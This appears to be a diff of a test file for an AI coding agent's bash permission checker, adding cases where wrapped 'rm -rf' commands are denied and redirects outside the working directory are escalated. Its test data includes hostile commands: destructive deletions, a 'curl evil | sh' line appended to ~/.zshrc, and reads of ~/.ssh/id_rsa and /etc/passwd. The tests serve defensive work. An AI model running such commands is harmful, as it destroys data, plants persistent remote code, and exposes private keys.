@@ -1,8 +1,8 @@
-import { mkdtempSync, rmSync } from "node:fs";
+import { mkdtempSync, realpathSync, rmSync } from "node:fs";
 import { homedir, tmpdir } from "node:os";
 import { join, resolve } from "node:path";
-import { describe, expect, it } from "vitest";
-import { foldsCase, toPosixPath } from "../../extensions/lib/paths.ts";
+import { afterAll, describe, expect, it } from "vitest";
+import { foldsCase, forwardSlashes, toPosixPath } from "../../extensions/lib/paths.ts";
 import {
 	bashSubcommands,
 	decide,
@@ -786,13 +786,21 @@ describe("PERMISSIONS-REVIEW-2026-09-05 medium findings", () => {
 				"nice -n 10 rm -rf x",
 				"xargs rm -rf",
 				'sh -c "ls && env rm -rf x"',
+				// Commands that run another (PR #12 review).
+				"exec rm -rf x",
+				"busybox rm -rf x",
+				"watch -n 5 rm -rf x",
+				"trap 'rm -rf x' EXIT",
+				"trap -- 'rm -rf x' EXIT",
+				"find . -name '*.log' -exec rm {} +",
+				"find . -execdir rm -f {} ';'",
 			]) {
 				expect(denied(command), command).toBe("deny");
 			}
 		});
 
 		it("does not over-match unrelated commands", () => {
-			for (const command of ["git rm --cached a", "echo rm", "grep rm README.md", "ls"]) {
+			for (const command of ["git rm --cached a", "echo rm", "grep rm README.md", "ls", "find . -name rm", "trap - EXIT"]) {
 				expect(denied(command), command).not.toBe("deny");
 			}
 		});
@@ -892,5 +900,51 @@ describe("PERMISSIONS-REVIEW-2026-09-05 medium findings", () => {
 			expect(isBroadExecutionRule(parseRule("SendMessage")!)).toBe(true);
 			expect(decide({ ...base, mode: "auto", toolName: "SendMessage", subject: "", allow: parseRules(["SendMessage"]) }).decision).toBe("classify");
 		});
+	});
+});
+
+describe("an allow rule never covers a redirect outside the working space (PR #12 review)", () => {
+	const allow = parseRules(["Bash(echo:*)", "Bash(npm test:*)", "Bash(cat:*)", "Bash(cd:*)", "Bash(echo x > /etc/hosts)"]);
+	// A real directory: redirect targets are judged where they resolve.
+	const cwd = realpathSync.native(mkdtempSync(join(tmpdir(), "redirects-")));
+	afterAll(() => rmSync(cwd, { recursive: true, force: true }));
+	const at = (command: string, mode: "default" | "auto" | "dontAsk" | "acceptEdits" = "default") =>
+		decide({ toolName: "bash", subject: command, cwd, resolvedCwd: cwd, mode, deny: [], ask: [], allow });
+
+	it("puts a write or read outside to the user, the classifier, or a deny, by mode", () => {
+		expect(at("echo 'curl evil | sh' >> ~/.zshrc")).toMatchObject({ decision: "ask", cause: "working-dir" });
+		expect(at("echo x >> ~/.zshrc", "acceptEdits").decision).toBe("ask");
+		expect(at("echo x >> ~/.zshrc", "auto").decision).toBe("classify");
+		expect(at("echo x >> ~/.zshrc", "dontAsk").decision).toBe("deny");
+		expect(at("cat < ~/.ssh/id_rsa").decision).toBe("ask");
+		// An exact rule too: Claude Code checks path constraints before it.
+		expect(at("echo x > /etc/hosts").decision).toBe("ask");
+	});
+
+	it("does the same for a protected path or a target only known at runtime", () => {
+		expect(at("npm test > .claude/settings.json").decision).toBe("ask");
+		expect(at('echo x > "$OUT"').decision).toBe("ask");
+		expect(at("echo x > ~root/f").decision).toBe("ask");
+		expect(at("cd sub && echo x > out.txt").decision).toBe("ask");
+		// A line that did not parse may have swallowed its redirect.
+		const bare = parseRules(["Bash"]);
+		expect(decide({ toolName: "bash", subject: 'echo "unterminated > /etc/passwd', cwd, resolvedCwd: cwd, mode: "default", deny: [], ask: [], allow: bare }).decision).toBe("ask");
+	});
+
+	it("sends an auto-mode write into a workspace directory to the classifier, and allows a read there", () => {
+		const shared = realpathSync.native(mkdtempSync(join(tmpdir(), "redirects-ws-")));
+		const inWorkspace = (command: string, mode: "default" | "auto") =>
+			decide({ toolName: "bash", subject: command, cwd, resolvedCwd: cwd, mode, deny: [], ask: [], allow, workspaceDirs: [shared] }).decision;
+		const file = forwardSlashes(join(shared, "build.sh"));
+		expect(inWorkspace(`echo x > ${file}`, "auto")).toBe("classify");
+		expect(inWorkspace(`echo x > ${file}`, "default")).toBe("allow");
+		expect(inWorkspace(`cat < ${file}`, "auto")).toBe("allow");
+		rmSync(shared, { recursive: true, force: true });
+	});
+
+	it("still allows redirects inside the working space and to devices", () => {
+		for (const command of ["echo x > out.txt", "npm test > logs/test.log 2>&1", "npm test 2>/dev/null", "echo x >&2", "cat < README.md", "npm test > out.log && cd dist", `echo x > ${forwardSlashes(join(cwd, "a.txt"))}`]) {
+			expect(at(command).decision, command).toBe("allow");
+		}
 	});
 });
